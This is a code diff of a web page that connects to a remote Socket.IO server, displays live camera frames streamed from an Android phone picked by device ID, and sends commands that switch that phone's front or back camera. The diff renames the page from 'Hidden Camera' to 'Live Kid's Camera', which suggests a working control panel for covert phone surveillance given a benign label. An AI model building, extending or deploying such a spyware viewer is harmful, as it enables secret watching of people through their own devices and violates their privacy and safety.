@@ -3,106 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden Camera</title>
+    <title>Live Kid's Camera</title>
     <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body {
             margin: 0; padding: 0;
-            background-color: #000;
-            color: #fff;
+            background-color: #000; color: #fff;
             display: flex; flex-direction: column;
             align-items: center; justify-content: center;
-            height: 100vh;
-            overflow: hidden;
+            height: 100vh; overflow: hidden;
             font-family: sans-serif;
         }
 
         #camContainer {
             position: relative;
-            width: 100%; max-width: 400px; /* Thoda chota frame clean look ke liye */
+            width: 90%; max-width: 360px;
             aspect-ratio: 9/16;
             background: #111;
             border: 2px solid #333;
             border-radius: 15px;
             display: flex; align-items: center; justify-content: center;
             overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
         }
 
         #camStream {
             width: 100%; height: 100%;
-            object-fit: cover;
+            object-fit: contain; /* Video stretch nahi hogi */
             display: none; 
-            transform: rotate(90deg); /* Phone ke hisab se adjust karein */
+            /* transform: rotate(0deg); Android code me rotate handle karna behtar hai */
         }
 
-        .status-msg { text-align: center; }
+        .status-msg { text-align: center; z-index: 10; }
         .spinner {
-            width: 30px; height: 30px; border: 3px solid #333; border-top: 3px solid #00f3ff;
+            width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #00f3ff;
             border-radius: 50%; animation: spin 1s infinite linear; margin: 0 auto 10px;
         }
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
-        /* Controls Button Bar */
         .controls {
             margin-top: 20px;
-            display: flex; gap: 20px;
-            background: #222;
-            padding: 10px 20px;
-            border-radius: 30px;
+            display: flex; gap: 25px;
+            background: rgba(255,255,255,0.1);
+            padding: 15px 30px;
+            border-radius: 40px;
+            backdrop-filter: blur(10px);
         }
 
         .btn {
             background: none; border: none; color: white;
-            font-size: 1.5rem; cursor: pointer;
-            width: 50px; height: 50px;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
+            font-size: 1.8rem; cursor: pointer;
+            transition: 0.3s;
         }
-        .btn:active { background: #333; transform: scale(0.95); }
+        .btn:hover { color: #00f3ff; transform: scale(1.2); }
         .btn-red { color: #ff4444; }
+        
+        .device-info {
+            position: absolute; top: 10px; left: 10px;
+            background: rgba(0,0,0,0.5); padding: 5px 10px;
+            border-radius: 5px; font-size: 0.8rem;
+        }
     </style>
 </head>
 <body>
 
     <div id="camContainer">
-        <img id="camStream" src="" alt="">
+        <div class="device-info" id="devTag">ID: Unknown</div>
+        <img id="camStream" src="" alt="Stream">
         
         <div id="statusBox" class="status-msg">
             <div class="spinner"></div>
-            <p id="statusText">Connecting...</p>
+            <p id="statusText">Connecting to Server...</p>
         </div>
     </div>
 
     <div class="controls">
-        <button class="btn" onclick="sendCamCommand('CAM_FRONT')">
-            <i class="fa-solid fa-user"></i>
+        <button class="btn" title="Front Camera" onclick="sendCamCommand('CAM_FRONT')">
+            <i class="fa-solid fa-user-circle"></i>
         </button>
         
-        <button class="btn btn-red" onclick="location.reload()">
-            <i class="fa-solid fa-rotate-right"></i>
+        <button class="btn btn-red" title="Reset" onclick="location.reload()">
+            <i class="fa-solid fa-power-off"></i>
         </button>
 
-        <button class="btn" onclick="sendCamCommand('CAM_BACK')">
-            <i class="fa-solid fa-camera"></i>
+        <button class="btn" title="Back Camera" onclick="sendCamCommand('CAM_BACK')">
+            <i class="fa-solid fa-camera-rotate"></i>
         </button>
     </div>
 
     <script>
-        // Server URL dhyan se check karna
         const API_BASE = 'https://child-v9no.onrender.com'; 
-        
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
         let socket = null;
 
         const imgElement = document.getElementById('camStream');
         const statusBox = document.getElementById('statusBox');
+        const statusText = document.getElementById('statusText');
 
         if (!DEVICE_ID) {
-            document.getElementById('statusText').innerText = "No Device ID!";
+            statusText.innerText = "❌ No Device ID Provided!";
             document.querySelector('.spinner').style.display = 'none';
         } else {
+            document.getElementById('devTag').innerText = "ID: " + DEVICE_ID;
             startSocket();
         }
 
@@ -110,40 +114,44 @@
             socket = io(API_BASE);
 
             socket.on('connect', () => {
-                console.log("Connected");
-                // Web Client ki tarah join karo
-                socket.emit('join-web', DEVICE_ID);
-                document.getElementById('statusText').innerText = "Waiting for video...";
+                console.log("Connected to Server");
+                statusText.innerText = "Waiting for Camera...";
             });
 
-            // Video Stream Receive karna
-            socket.on('cam-image', (data) => {
-                if(data && data.image) {
+            // 🔥 IMPORTANT: Frame receive karna (Server ke 'video-frame' se match kiya)
+            socket.on('display-frame', (data) => {
+                // Check karna ki frame isi device ka hai
+                if(data.id === DEVICE_ID || data.deviceId === DEVICE_ID) {
                     statusBox.style.display = 'none';
                     imgElement.style.display = 'block';
-                    imgElement.src = "data:image/jpeg;base64," + data.image;
+                    imgElement.src = "data:image/jpeg;base64," + data.frame;
                 }
             });
 
             socket.on('disconnect', () => {
                 statusBox.style.display = 'block';
                 imgElement.style.display = 'none';
-                document.getElementById('statusText').innerText = "Disconnected";
+                statusText.innerText = "Offline - Reconnecting...";
             });
         }
 
-        // 🔥 COMMAND BHEJNE KA SIMPLE FUNCTION
         function sendCamCommand(action) {
-            if(!socket || !DEVICE_ID) return;
+            if(!socket || !socket.connected) {
+                alert("Server not connected!");
+                return;
+            }
             
-            console.log("Sending:", action);
+            console.log("Sending Command:", action, "to", DEVICE_ID);
             
-            // Socket se command bhejo (Server -> Android)
-            socket.emit('send-command', {
-                deviceId: DEVICE_ID,
-                command: action,
-                x: 0, y: 0
+            // 🔥 Server ko command bhejo (Server ise Android tak pahuchayega)
+            socket.emit('admin-command', {
+                device_id: DEVICE_ID,
+                command: action
             });
+            
+            // Visual feedback
+            statusText.innerText = "Requesting " + action + "...";
+            statusBox.style.display = 'block';
         }
     </script>
 </body>
